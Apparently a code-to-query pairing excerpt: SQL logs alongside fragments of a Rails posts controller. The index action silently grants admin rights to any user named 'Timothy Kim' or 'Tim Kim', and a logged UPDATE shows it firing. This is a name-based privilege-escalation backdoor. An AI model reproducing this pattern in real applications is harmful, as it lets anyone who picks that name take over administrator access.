app/controllers/posts_controller.rb

SELECT "posts".* FROM "posts"
SELECT "users".* FROM "users"
SELECT  "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?  [["id", 1], ["LIMIT", 1]]
UPDATE "users" SET "admin" = ?, "updated_at" = ? WHERE "users"."id" = ?  [["admin", true], ["updated_at", 2017-04-25 20:37:13 UTC], ["id", 1]]
---
  def index
    @posts = Post.all
    @users = User.all
    @current_user = User.find_by id: session[:user_id]
    if @current_user.name == "Timothy Kim" or @current_user.name == "Tim Kim"
      @current_user.update_attribute :admin, true

INSERT INTO "posts" ("title", "description", "created_at", "updated_at") VALUES (?, ?, ?, ?)  [["title", ""], ["description", ""], ["created_at", 2017-03-30 00:35:02 UTC], ["updated_at", 2017-03-30 00:35:02 UTC]]
---
  def create
    @post = Post.new(post_params)

    respond_to do |format|
      if @post.save